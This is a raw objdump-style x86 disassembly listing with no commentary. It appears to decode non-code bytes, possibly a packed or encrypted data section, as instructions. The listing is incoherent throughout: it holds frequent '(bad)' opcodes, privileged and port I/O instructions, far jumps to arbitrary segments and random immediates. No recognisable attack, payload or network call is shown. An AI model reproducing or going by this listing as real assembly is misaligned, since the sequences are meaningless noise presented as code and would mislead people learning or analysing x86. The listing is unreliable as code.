  41a178:	add    eax,DWORD PTR [edi-0x7d9acd69]
  41a17e:	cli    
  41a17f:	(bad)  
  41a180:	jle    0x41a149
  41a182:	dec    ebx
  41a183:	jg     0x41a1f8
  41a185:	loope  0x41a19d
  41a187:	rcr    DWORD PTR [edi+0x4f],0x5a
  41a18b:	sbb    ebp,ecx
  41a18d:	mov    al,0xad
  41a18f:	out    dx,al
  41a190:	test   eax,0x0
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	mov    bh,0xdf
  41a202:	aaa    
  41a203:	arpl   WORD PTR [esi],sp
  41a205:	adc    eax,0x1050001
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	mov    bl,0x38
  41a20e:	mov    eax,ds:0x26e2e975
  41a213:	push   esp
  41a214:	icebp  
  41a215:	xlat   BYTE PTR ds:[ebx]
  41a216:	adc    eax,0xb5d1f228
  41a21b:	push   0xd39ebd89
  41a220:	pusha  
  41a221:	daa    
  41a222:	ret    
  41a223:	xor    al,cl
  41a225:	jbe    0x41a1ed
  41a227:	fnsave cs:[esi+0x33]
  41a22b:	push   ss
  41a22c:	inc    esi
  41a22d:	dec    ecx
  41a22e:	call   DWORD PTR [esi]
  41a230:	pushf  
  41a231:	mov    bl,0xce
  41a233:	aam    0x94
  41a235:	push   cs
  41a236:	push   edi
  41a237:	dec    ecx
  41a238:	sub    cl,BYTE PTR [eax]
  41a23a:	lods   eax,DWORD PTR ds:[esi]
  41a23b:	(bad)  
  41a23d:	adc    edi,DWORD PTR ds:0x98b9a137
  41a243:	fwait
  41a244:	jp     0x41a1fc
  41a246:	push   es
  41a247:	mov    al,0xd7
  41a249:	cdq    
  41a24a:	add    BYTE PTR [ecx+0x39a7933a],bh
  41a250:	mov    bl,0xd
  41a252:	repnz rcr ecx,1
  41a255:	jle    0x41a27e
  41a257:	sbb    bh,dl
  41a259:	jle    0x41a22e
  41a25b:	cmp    dh,BYTE PTR [esi]
  41a25d:	fstp   QWORD PTR [eax]
  41a25f:	pop    edi
  41a260:	(bad)  
  41a261:	sbb    eax,0x451d517f
  41a266:	fwait
  41a267:	in     eax,dx
  41a268:	dec    eax
  41a269:	push   cs
  41a26a:	pop    ebx
  41a26b:	sbb    eax,0x44396789
  41a270:	sbb    BYTE PTR [edx],ah
  41a272:	or     cl,bl
  41a274:	cmp    al,0xad
  41a276:	aad    0x21
  41a278:	popa   
  41a279:	jo     0x41a26a
  41a27b:	adc    BYTE PTR [ebx],ch
  41a27d:	xor    eax,0xba369b61
  41a282:	rol    BYTE PTR [eax],0x2d
  41a285:	jmp    0x41a236
  41a287:	jae    0x41a2cb
  41a289:	add    eax,0x4adad8de
  41a28e:	xchg   edi,eax
  41a28f:	in     eax,0xb0
  41a291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a292:	adc    eax,0x32df5a60
  41a297:	push   cs
  41a298:	gs jb  0x41a285
  41a29b:	or     eax,DWORD PTR [ebx]
  41a29d:	in     al,dx
  41a29e:	mov    ebp,0x653b60b7
  41a2a3:	inc    edx
  41a2a4:	jb     0x41a2c6
  41a2a6:	mov    ebp,0xf5b35732
  41a2ab:	sub    al,0xab
  41a2ad:	fadd   DWORD PTR [edi+0x6e9f7d7e]
  41a2b3:	(bad)  
  41a2b4:	das    
  41a2b5:	mov    ebp,0xbb73bbb4
  41a2ba:	cdq    
  41a2bb:	jge    0x41a325
  41a2bd:	mov    WORD PTR [edi+ebx*4],cs
  41a2c0:	jle    0x41a301
  41a2c2:	mov    edx,0xdb55bd68
  41a2c7:	jnp    0x41a259
  41a2c9:	scas   al,BYTE PTR es:[edi]
  41a2ca:	mov    cl,0xe5
  41a2cc:	js     0x41a337
  41a2ce:	pop    es
  41a2cf:	setg   BYTE PTR [esi+0x38]
  41a2d3:	fst    QWORD PTR [edi+0x3c91c288]
  41a2d9:	(bad)  [ebx]
  41a2db:	je     0x41a34e
  41a2dd:	lahf   
  41a2de:	imul   esi,DWORD PTR [ebx-0x67],0xffffffeb
  41a2e2:	dec    esp
  41a2e3:	ficom  WORD PTR ds:0x63863b89
  41a2e9:	sbb    eax,0xffcc4de3
  41a2ee:	sub    BYTE PTR [eax],0x84
  41a2f1:	add    edi,DWORD PTR [si]
  41a2f4:	mov    esi,0x5937103d
  41a2f9:	iret   
  41a2fa:	loop   0x41a337
  41a2fc:	mov    al,0xb1
  41a2fe:	or     eax,0xd10daeed
  41a303:	imul   ebp,DWORD PTR [edx],0xd9fec587
  41a309:	jae    0x41a367
  41a30b:	mov    esp,0xd5a89f10
  41a310:	and    al,BYTE PTR [eax]
	...
  41a372:	add    BYTE PTR [eax],al
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	mov    eax,0x2bca5a4b
  41a385:	push   ss
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0x40000001
  41a38d:	cmp    esi,DWORD PTR [edx+0x690ca453]
  41a393:	test   eax,0xec2b5e8b
  41a398:	jne    0x41a3d2
  41a39a:	daa    
  41a39b:	inc    esi
  41a39c:	ss dec edx
  41a39e:	out    0x42,eax
  41a3a0:	gs cld 
  41a3a2:	pop    esp
  41a3a3:	stos   BYTE PTR es:[edi],al
  41a3a4:	stc    
  41a3a5:	scas   eax,DWORD PTR es:[edi]
  41a3a6:	push   ss
  41a3a7:	sar    DWORD PTR [ebp+0x21],1
  41a3aa:	cmp    cl,BYTE PTR [ebx-0x4d2a250d]
  41a3b0:	or     al,BYTE PTR [edx]
  41a3b2:	xchg   esi,eax
  41a3b3:	sbb    bl,BYTE PTR [edi-0x41ca20f5]
  41a3b9:	ds (bad) 
  41a3bb:	shl    BYTE PTR [ebx+eiz*8-0x3a],cl
  41a3bf:	lds    edx,FWORD PTR [esi]
  41a3c1:	jbe    0x41a350
  41a3c3:	pusha  
  41a3c4:	clc    
  41a3c5:	fs leave 
  41a3c7:	mov    ah,0x4e
  41a3c9:	push   0x288b88b4
  41a3ce:	fcmove st,st(3)
  41a3d0:	mov    bh,0x82
  41a3d2:	push   0x16846bde
  41a3d7:	add    DWORD PTR [bp+0x16],ebx
  41a3db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3dc:	sub    bh,BYTE PTR [edi+0x7]
  41a3df:	mov    ah,0x15
  41a3e1:	out    dx,al
  41a3e2:	mov    dl,0x63
  41a3e4:	mov    ebx,edi
  41a3e6:	test   BYTE PTR [eax+0x18],dl
  41a3e9:	mov    dh,0x28
  41a3eb:	add    eax,0xa2fe0f53
  41a3f0:	aam    0x7b
  41a3f2:	inc    ebx
  41a3f3:	cli    
  41a3f4:	lods   eax,DWORD PTR ds:[esi]
  41a3f5:	stos   DWORD PTR es:[edi],eax
  41a3f6:	les    ecx,FWORD PTR [edx+0x25]
  41a3f9:	js     0x41a3a1
  41a3fb:	add    dh,BYTE PTR [esi]
  41a3fd:	stos   DWORD PTR es:[edi],eax
  41a3fe:	jmp    0x41a385
  41a400:	dec    esi
  41a401:	aas    
  41a402:	test   eax,0xecac08ee
  41a407:	and    bl,BYTE PTR [esi]
  41a409:	or     BYTE PTR [edi],0x6
  41a40c:	mov    DWORD PTR [esi+eax*8],ebx
  41a40f:	xor    dh,BYTE PTR [eax]
  41a411:	push   esi
  41a412:	pushf  
  41a413:	xchg   ebx,eax
  41a414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a415:	push   ecx
  41a416:	add    edi,edi
  41a418:	mov    ebx,0xbd06690e
  41a41d:	dec    edi
  41a41e:	inc    edx
  41a41f:	ins    BYTE PTR es:[edi],dx
  41a420:	sbb    ch,BYTE PTR [ebp-0x2c]
  41a423:	mov    eax,tr7
  41a426:	(bad)  
  41a427:	nop
  41a428:	mov    bl,0x3f
  41a42a:	pushf  
  41a42b:	fild   WORD PTR ds:0x1463d47
  41a431:	mov    edx,0x29e9fb98
  41a436:	xchg   ecx,eax
  41a437:	in     al,0x36
  41a439:	fadd   QWORD PTR [esi]
  41a43b:	or     al,0x9e
  41a43d:	xor    eax,0x501380b7
  41a442:	and    al,0x47
  41a444:	les    ebx,FWORD PTR [ebx]
  41a446:	cmp    DWORD PTR [edi-0x22],ebp
  41a449:	or     bl,BYTE PTR [ecx]
  41a44b:	jecxz  0x41a43c
  41a44d:	iret   
  41a44e:	test   eax,0xc347c0fd
  41a453:	popa   
  41a454:	sbb    eax,0xcb309eae
  41a459:	not    DWORD PTR [edi+ecx*8]
  41a45c:	mov    ?,WORD PTR [ecx+0x6377a2f0]
  41a462:	pop    ds
  41a463:	and    eax,0x18ae8795
  41a468:	or     al,0xc3
  41a46a:	pop    edi
  41a46b:	xchg   ebp,eax
  41a46c:	dec    edx
  41a46d:	inc    edi
  41a46e:	cmp    al,0x52
  41a470:	sub    DWORD PTR [eax-0x20],0x6ad39251
  41a477:	rcl    DWORD PTR [ebx],1
  41a479:	ins    DWORD PTR es:[edi],dx
  41a47a:	mov    al,ds:0x597446af
  41a47f:	push   ebx
  41a480:	pop    edx
  41a481:	push   ebp
  41a482:	and    bh,BYTE PTR [edi+0x71]
  41a485:	mov    bl,0xfa
  41a487:	cmc    
  41a488:	dec    edx
  41a489:	jns    0x41a476
  41a48b:	lods   eax,DWORD PTR ds:[esi]
  41a48c:	mov    eax,0xd430be57
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	pop    ds
  41a501:	mov    esp,0x17306803
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0xfe000001
  41a50d:	out    0xf8,al
  41a50f:	push   cs
  41a510:	int    0xbc
  41a512:	mov    eax,0x8f2b9d6f
  41a517:	fisttp WORD PTR [ebp-0xc3f6467]
  41a51d:	hlt    
  41a51e:	jg     0x41a52d
  41a520:	mov    ds:0xa564176f,eax
  41a525:	jmp    0x23b9:0xa836d3b3
  41a52c:	or     dl,BYTE PTR [esi]
  41a52e:	xchg   ebx,eax
  41a52f:	sub    BYTE PTR [ebp+0x47f5134d],bh
  41a535:	rcl    dh,1
  41a537:	stos   BYTE PTR es:[edi],al
  41a538:	je     0x41a5a2
  41a53a:	sar    DWORD PTR [eax+0xf],1
  41a53d:	das    
  41a53e:	xor    BYTE PTR [esi+ebx*4],0xf5
  41a542:	inc    ebp
  41a543:	iret   
  41a544:	push   ds
  41a545:	mov    bl,BYTE PTR [eax-0x1cac7178]
  41a54b:	icebp  
  41a54c:	lds    esi,FWORD PTR [eax]
  41a54e:	jmp    0xd13b:0x270ecb5a
  41a555:	jge    0x41a5c0
  41a557:	jle    0x41a4de
  41a559:	push   ds
  41a55a:	(bad)  
  41a55b:	jae    0x41a596
  41a55d:	pusha  
  41a55e:	nop
  41a55f:	dec    ebp
  41a560:	adc    DWORD PTR [eax+0xe4bc63f],esp
  41a566:	xchg   ecx,eax
  41a567:	test   BYTE PTR [esp+ebx*1],ch
  41a56a:	cs pushf 
  41a56c:	add    DWORD PTR [eax+0x2a],ecx
  41a56f:	fcmovne st,st(2)
  41a571:	mov    DWORD PTR [ebx-0x5e4924a8],0xe566438c
  41a57b:	xchg   edx,eax
  41a57c:	repnz (bad)
  41a57f:	stos   DWORD PTR es:[edi],eax
  41a580:	cmp    eax,0x90bc6c11
  41a585:	nop
  41a586:	in     eax,0x98
  41a588:	fnstcw WORD PTR [ecx]
  41a58a:	dec    ebp
  41a58b:	push   es
  41a58c:	xchg   esi,eax
  41a58d:	pop    ss
  41a58e:	ds jmp 0xe217:0x493f4470
  41a596:	mov    esi,0x7718655b
  41a59b:	mov    esp,0x8fbeadee
  41a5a0:	mov    ?,WORD PTR [edx+esi*8-0x6d12c175]
  41a5a7:	sbb    al,0xc
  41a5a9:	fmul   DWORD PTR [ecx-0x78]
  41a5ac:	add    esp,eax
  41a5ae:	out    dx,al
  41a5af:	add    dh,dl
  41a5b1:	scas   eax,DWORD PTR es:[edi]
  41a5b2:	dec    esp
  41a5b3:	daa    
  41a5b4:	push   es
  41a5b5:	lock xor eax,0xba73db5f
  41a5bb:	pop    ebp
  41a5bc:	push   0xffffffac
  41a5be:	and    esp,ecx
  41a5c0:	mov    cl,0xeb
  41a5c2:	adc    eax,0x72710cb5
  41a5c7:	jb     0x41a638
  41a5c9:	lods   al,BYTE PTR ds:[esi]
  41a5ca:	das    
  41a5cb:	nop
  41a5cc:	dec    ecx
  41a5cd:	aas    
  41a5ce:	scas   eax,DWORD PTR es:[edi]
  41a5cf:	xchg   ecx,eax
  41a5d0:	jle    0x41a5fa
  41a5d2:	outs   dx,BYTE PTR ds:[esi]
  41a5d3:	jl     0x41a5db
  41a5d5:	sbb    BYTE PTR [ecx-0x5c884158],0x5a
  41a5dc:	test   al,0x93
  41a5de:	push   ebp
  41a5df:	dec    esi
  41a5e0:	ret    
  41a5e1:	gs call 0xc3eb65ef
  41a5e7:	jnp    0x41a582
  41a5e9:	leave  
  41a5ea:	nop
  41a5eb:	stc    
  41a5ec:	(bad)  
  41a5ed:	pop    ebx
  41a5ee:	jnp    0x41a58c
  41a5f0:	(bad)  
  41a5f1:	xchg   ecx,eax
  41a5f2:	mov    eax,ds:0xf6965765
  41a5f7:	jns    0x41a5cf
  41a5f9:	xchg   ebp,eax
  41a5fa:	mov    eax,0xe15bb341
  41a5ff:	pushf  
  41a600:	pusha  
  41a601:	or     eax,0x2139c9a0
  41a606:	test   al,0x9b
  41a608:	xchg   edi,eax
  41a609:	inc    edi
  41a60a:	cmp    bh,BYTE PTR [eax-0x47]
  41a60d:	jae    0x41a629
  41a60f:	mov    ah,0x5b
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x1c77a625
  41a682:	out    0xea,eax
  41a684:	xor    eax,0x5000118
  41a689:	add    DWORD PTR [eax],eax
  41a68b:	add    BYTE PTR [edi+0x11f9adb9],bh
  41a691:	mov    BYTE PTR [ecx+eiz*1],0xba
  41a695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a696:	and    cl,bh
  41a698:	push   ebp
  41a699:	call   0xe96b:0xaceec517
  41a6a0:	cwde   
  41a6a1:	xchg   ecx,eax
  41a6a2:	aas    
  41a6a3:	pop    ds
  41a6a4:	outs   dx,BYTE PTR ds:[esi]
  41a6a5:	lods   al,BYTE PTR ds:[esi]
  41a6a6:	mov    ds:0x3b2f2d35,eax
  41a6ab:	into   
  41a6ac:	(bad)  
  41a6ae:	jo     0x41a687
  41a6b0:	js     0x41a637
  41a6b2:	popf   
  41a6b3:	push   ds
  41a6b4:	jecxz  0x41a6e0
  41a6b6:	loop   0x41a6e3
  41a6b8:	or     ebx,DWORD PTR [ebx+ebx*2-0x3ce00d6d]
  41a6bf:	xchg   ecx,eax
  41a6c0:	sti    
  41a6c1:	jb     0x41a6b6
  41a6c3:	fsincos 
  41a6c5:	cld    
  41a6c6:	sbb    ah,cl
  41a6c8:	idiv   DWORD PTR [ecx-0x2ef7ce97]
  41a6ce:	sbb    edi,edx
  41a6d0:	xor    eax,0xeef57a5c
  41a6d5:	mov    al,0x68
  41a6d7:	mov    cl,0x59
  41a6d9:	popf   
  41a6da:	loopne 0x41a738
  41a6dc:	add    esi,DWORD PTR ds:0xff523a46
  41a6e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6e3:	mov    ds:0x698ea041,eax
  41a6e8:	stos   BYTE PTR es:[edi],al
  41a6e9:	es loop 0x41a6fd
  41a6ec:	imul   esi,DWORD PTR [ecx],0xffffffa8
  41a6ef:	jge    0x41a6a0
  41a6f1:	dec    edx
  41a6f2:	lods   al,BYTE PTR ds:[esi]
  41a6f3:	rol    cl,0x7a
  41a6f6:	std    
  41a6f7:	xchg   esp,eax
  41a6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6f9:	popa   
  41a6fa:	or     ch,BYTE PTR gs:[edi+0x463ac2e3]
  41a701:	xchg   ebp,eax
  41a702:	leave  
  41a703:	pop    edx
  41a704:	fst    QWORD PTR [esi+0x19]
  41a707:	jno    0x41a71c
  41a709:	push   ecx
  41a70a:	mov    esp,0xee63d03b
  41a710:	mov    ds:0xc2d385dc,eax
  41a715:	pop    eax
  41a716:	stos   DWORD PTR es:[edi],eax
  41a717:	mov    ebx,0xa70902e3
  41a71c:	mov    ebx,0x56808790
  41a721:	inc    ebx
  41a722:	sub    dl,bl
  41a724:	add    DWORD PTR [ebp+0x3d],esi
  41a727:	push   eax
  41a728:	inc    ebp
  41a729:	push   esi
  41a72a:	dec    esp
  41a72b:	popf   
  41a72c:	adc    esp,DWORD PTR ds:0xa53dc546
  41a732:	dec    ecx
  41a733:	stos   DWORD PTR es:[edi],eax
  41a734:	outs   dx,BYTE PTR gs:[esi]
  41a736:	popa   
  41a737:	neg    DWORD PTR [ebx+0x6c]
  41a73a:	es mov esi,0x4daddd
  41a740:	push   ecx
  41a741:	add    BYTE PTR [esi+0x7f],bh
  41a744:	push   edx
  41a745:	loopne 0x41a6fe
  41a747:	xor    al,0x9f
  41a749:	jmp    DWORD PTR [eax-0x47]
  41a74d:	xlat   BYTE PTR ds:[ebx]
  41a74e:	mov    esp,0x26c9dc76
  41a753:	(bad)  
  41a755:	int    0x2a
  41a757:	test   al,0x85
  41a759:	sahf   
  41a75a:	inc    edi
  41a75b:	jb     0x41a786
  41a75d:	call   0x2505dd31
  41a762:	jmp    0x41a7bf
  41a764:	je     0x41a7c6
  41a766:	fbstp  TBYTE PTR [edx]
  41a768:	(bad)  
  41a769:	enter  0xf5b0,0x3
  41a76d:	sbb    eax,0xf51ed76f
  41a772:	(bad)  
  41a773:	in     al,0xd4
  41a775:	adc    cl,BYTE PTR [esi]
  41a777:	cmp    DWORD PTR [edx+0x5e0f25cc],0xffffffb2
  41a77e:	inc    edi
  41a77f:	jo     0x41a74d
  41a781:	lahf   
  41a782:	xchg   BYTE PTR [ecx],al
  41a784:	adc    cl,BYTE PTR [edi-0x33]
  41a787:	fwait
  41a788:	xor    cl,al
  41a78a:	xchg   edi,eax
  41a78b:	clc    
  41a78c:	rcl    BYTE PTR [eax+edx*4],cl
  41a78f:	adc    al,0x75
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x955327ca,al
  41a801:	(bad)  
  41a802:	call   0x15ae24f
  41a807:	add    BYTE PTR ds:0xc6000001,al
  41a80d:	repz loope 0x41a854
  41a810:	sub    BYTE PTR [ecx+0x3a],cl
  41a813:	jmp    0x41a88b
  41a815:	jg     0x41a7cc
  41a817:	aaa    
  41a818:	adc    ch,BYTE PTR [edx]
  41a81a:	add    eax,0x7ca9c26e
  41a81f:	cmp    DWORD PTR [esi-0x3fa9ad76],ebx
  41a825:	adc    DWORD PTR [edx+edi*4],ecx
  41a828:	int    0x69
  41a82a:	sar    BYTE PTR [eax],1
  41a82c:	sbb    BYTE PTR [ecx],0x30
  41a82f:	dec    DWORD PTR [eax+0x2d]
  41a832:	cwde   
  41a833:	enter  0x2177,0x90
  41a837:	retf   
  41a838:	test   DWORD PTR [edi-0xe8ba0b0],edi
  41a83e:	inc    ebx
  41a83f:	cli    
  41a840:	dec    ebp
  41a841:	sub    al,0xc1
  41a843:	lds    ebx,FWORD PTR [esi]
  41a845:	and    dh,BYTE PTR [edx+0x66]
  41a848:	mov    al,ds:0x7722212
  41a84d:	dec    edx
  41a84e:	repz fcmovnu st,st(5)
  41a851:	(bad)  
  41a852:	mov    ebp,0x4ff72bc6
  41a857:	xchg   ebp,eax
  41a858:	cmp    DWORD PTR [edx+0x740be46],ecx
  41a85e:	shr    cl,cl
  41a860:	sub    eax,0x5775864b
  41a865:	and    BYTE PTR es:[edx-0x47],0x64
  41a86a:	mov    bh,0x53
  41a86c:	and    bh,BYTE PTR [edi+0x4f]
  41a86f:	jmp    0x41a86e
  41a871:	inc    eax
  41a872:	pop    eax
  41a873:	push   es
  41a874:	sti    
  41a875:	retf   
  41a876:	aaa    
  41a877:	sbb    cl,al
  41a879:	xchg   esi,eax
  41a87a:	sub    ecx,DWORD PTR [eax+0x2]
  41a87d:	mov    edi,0xe8f4b245
  41a882:	jns    0x41a81e
  41a884:	sbb    al,0x6d
  41a886:	push   cs
  41a887:	mov    ds:0x86214b2e,eax
  41a88c:	or     edi,DWORD PTR [ecx-0x72]
  41a88f:	xchg   esi,eax
  41a890:	inc    ecx
  41a891:	xor    ebx,DWORD PTR [esi+0x3f]
  41a894:	imul   eax,DWORD PTR [ebp-0x67a1ec36],0x4abd6471
  41a89e:	cs push es
  41a8a0:	popa   
  41a8a1:	cdq    
  41a8a2:	mov    al,0xc1
  41a8a4:	out    dx,al
  41a8a5:	pop    edi
  41a8a6:	lds    edi,FWORD PTR [eax-0x17]
  41a8a9:	ss aad 0xc6
  41a8ac:	push   ecx
  41a8ad:	sbb    ebp,DWORD PTR [ecx]
  41a8af:	cmp    bl,BYTE PTR [esi-0xf5aec23]
  41a8b5:	dec    edx
  41a8b6:	js     0x41a887
  41a8b8:	pop    ds
  41a8b9:	xchg   edx,eax
  41a8ba:	mov    ecx,0xbadd48a9
  41a8bf:	push   ds
  41a8c0:	jmp    FWORD PTR [esi+0x6a]
  41a8c3:	idiv   BYTE PTR [ebx]
  41a8c5:	neg    DWORD PTR [edi-0x32bca1a]
  41a8cb:	inc    esp
  41a8cc:	jg     0x41a89f
  41a8ce:	mov    edx,0x1ab83b2
  41a8d3:	xchg   BYTE PTR [ebp-0x45],al
  41a8d6:	jne    0x41a8c6
  41a8d8:	pop    ecx
  41a8d9:	ins    BYTE PTR es:[edi],dx
  41a8da:	xlat   BYTE PTR ds:[ebx]
  41a8db:	loopne 0x41a8b0
  41a8dd:	inc    ebp
  41a8de:	jg     0x41a904
  41a8e0:	ja     0x41a8eb
  41a8e2:	push   eax
  41a8e3:	aaa    
  41a8e4:	xchg   ebp,eax
  41a8e5:	mov    ch,cl
  41a8e7:	stos   DWORD PTR es:[edi],eax
  41a8e8:	dec    edi
  41a8e9:	xchg   ebp,eax
  41a8ea:	lea    esi,[ecx+0xc]
  41a8ed:	mov    cl,0xe1
  41a8ef:	aaa    
  41a8f0:	xor    eax,0xcd6cd9b9
  41a8f5:	sbb    edx,DWORD PTR [ebx+ecx*2]
  41a8f8:	cmc    
  41a8f9:	or     eax,0x2511232e
  41a8fe:	imul   edi,DWORD PTR [edi-0x23],0x4ba77e8e
  41a905:	xchg   esp,eax
  41a906:	mov    edx,0x89b983e0
  41a90b:	(bad)  
  41a90c:	or     al,0x1d
  41a90e:	pusha  
  41a90f:	loop   0x41a965
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	loopne 0x41a999
  41a982:	test   eax,0x11a3f63
  41a987:	add    BYTE PTR ds:0x8a000001,al
  41a98d:	(bad)  
  41a98e:	push   cs
  41a98f:	adc    BYTE PTR [ebp+0x72],cl
  41a992:	sbb    DWORD PTR [esi],edx
  41a994:	test   ecx,ecx
  41a996:	clc    
  41a997:	sbb    eax,0x58a40504
  41a99c:	daa    
  41a99d:	inc    eax
  41a99e:	stos   BYTE PTR es:[edi],al
  41a99f:	aam    0x3a
  41a9a1:	xor    DWORD PTR ds:0x6aa949e6,edi
  41a9a7:	not    ebp
  41a9a9:	repz xchg edx,eax
  41a9ab:	pushf  
  41a9ac:	or     ah,BYTE PTR [ecx+0x751d834]
  41a9b2:	scas   eax,DWORD PTR es:[edi]
  41a9b3:	inc    ebp
  41a9b4:	push   ss
  41a9b5:	lahf   
  41a9b6:	fstp   DWORD PTR [ecx+0x1ac49ca0]
  41a9bc:	cli    
  41a9bd:	jmp    0x41a9c1
  41a9bf:	clc    
  41a9c0:	jp     0x41aa2a
  41a9c2:	je     0x41aa36
  41a9c4:	(bad)  
  41a9c5:	scas   al,BYTE PTR es:[edi]
  41a9c6:	mov    ch,0x8d
  41a9c8:	pop    ebx
  41a9c9:	pushw  ds
  41a9cb:	push   ecx
  41a9cc:	ins    DWORD PTR es:[edi],dx
  41a9cd:	mov    dl,0xa2
  41a9cf:	mov    ebx,0xdd11c201
  41a9d4:	push   edx
  41a9d5:	inc    esp
  41a9d6:	shr    DWORD PTR [eax+0x2],cl
  41a9d9:	nop
  41a9da:	add    BYTE PTR [eax+0x6d3df6d1],al
  41a9e0:	clc    
  41a9e1:	jg     0x41aa52
  41a9e3:	or     al,0x5e
  41a9e5:	icebp  
  41a9e6:	push   esp
  41a9e7:	out    0xab,eax
  41a9e9:	add    edx,DWORD PTR [eax]
  41a9eb:	and    al,BYTE PTR [edi+eiz*4+0x4d]
  41a9ef:	sub    eax,0xe733d182
  41a9f4:	cmp    ch,BYTE PTR [ebx+eiz*2-0x70]
  41a9f8:	aas    
  41a9f9:	lock out dx,al
  41a9fb:	std    
  41a9fc:	and    BYTE PTR [esi],bl
  41a9fe:	shl    ebp,1
  41aa00:	fsubr  st(2),st
  41aa02:	inc    ebp
  41aa03:	jg     0x41aa0c
  41aa05:	pop    ds
  41aa06:	xchg   esp,eax
  41aa07:	das    
  41aa08:	ins    BYTE PTR es:[edi],dx
  41aa09:	xor    eax,0x8e0d23a4
  41aa0e:	mov    dh,0xb8
  41aa10:	sbb    BYTE PTR [ecx+0x3f7f1fae],dl
  41aa16:	push   eax
  41aa17:	xchg   ebp,eax
  41aa18:	in     al,dx
  41aa19:	(bad)  
  41aa1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa1b:	ins    DWORD PTR es:[edi],dx
  41aa1c:	xor    dh,ah
  41aa1e:	adc    eax,DWORD PTR [esi]
  41aa20:	xor    ah,ch
  41aa22:	dec    esp
  41aa23:	mov    esp,esp
  41aa25:	mov    edi,0x88161356
  41aa2a:	popa   
  41aa2b:	and    dl,ch
  41aa2d:	mov    ch,0xcd
  41aa2f:	ret    
  41aa30:	push   esp
  41aa31:	mov    ecx,0xcea05e0b
  41aa36:	inc    edi
  41aa37:	test   edi,eax
  41aa39:	inc    edi
  41aa3a:	call   0xd246da3e
  41aa3f:	pop    ecx
  41aa40:	jmp    0xa029:0xf072a0b9
  41aa47:	(bad)  
  41aa48:	stos   DWORD PTR es:[edi],eax
  41aa49:	pop    eax
  41aa4a:	lea    eax,[ecx+0x6a834c64]
  41aa50:	push   es
  41aa51:	cmp    eax,0xe817e76f
  41aa56:	fcom   DWORD PTR [ebx+0x1225ada7]
  41aa5c:	daa    
  41aa5d:	ret    0xa48a
  41aa60:	push   ss
  41aa61:	inc    ebp
  41aa62:	fcmovbe st,st(7)
  41aa64:	pop    edi
  41aa65:	and    al,0x1f
  41aa67:	adc    edx,DWORD PTR [edi]
  41aa69:	es jae 0x41aa38
  41aa6c:	and    bh,BYTE PTR [edi]
  41aa6e:	(bad)  
  41aa6f:	push   ds
  41aa70:	shl    cl,cl
  41aa72:	pop    ds
  41aa73:	maxps  xmm0,XMMWORD PTR [ebx-0x7d]
  41aa77:	daa    
  41aa78:	mov    edi,0xf6b9e86a
  41aa7d:	pop    es
  41aa7e:	out    0x1,eax
  41aa80:	xor    dh,0xf8
  41aa83:	loop   0x41aa1d
  41aa85:	push   esp
  41aa86:	cmp    eax,0xce1c7bdb
  41aa8b:	dec    esi
  41aa8c:	push   ecx
  41aa8d:	mov    ds,eax
  41aa8f:	push   ss
  41aa90:	jmp    0x41aa95
	...
  41aaf1:	add    BYTE PTR [eax],al
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	int3   
  41ab01:	dec    edi
  41ab02:	rcl    DWORD PTR [ecx+0x11b44],0x5
  41ab09:	add    DWORD PTR [eax],eax
  41ab0b:	add    BYTE PTR [eax+0x59250c49],cl
  41ab11:	ret    0xa5c4
  41ab14:	icebp  
  41ab15:	add    BYTE PTR [eax-0x6b1fa480],0x8f
  41ab1c:	xor    al,cl
  41ab1e:	stos   BYTE PTR es:[edi],al
  41ab1f:	xchg   DWORD PTR [ebx+esi*2-0x198bdaca],ebx
  41ab26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab27:	dec    ebx
  41ab28:	imul   ebx,DWORD PTR [esi],0x25e42772
  41ab2e:	and    BYTE PTR [ecx+0x1fc967c6],0x4
  41ab35:	jnp    0x41ab10
  41ab37:	mov    DWORD PTR [ebp+0x57],edi
  41ab3a:	sub    al,0xc9
  41ab3c:	test   BYTE PTR [edi-0x7a],ch
  41ab3f:	ss push 0x740cbe96
  41ab45:	or     eax,0x31da1d07
  41ab4a:	push   esi
  41ab4b:	add    ecx,DWORD PTR [ecx]
  41ab4d:	nop
  41ab4e:	das    
  41ab4f:	cmc    
  41ab50:	ds xchg edx,eax
  41ab52:	pop    ebx
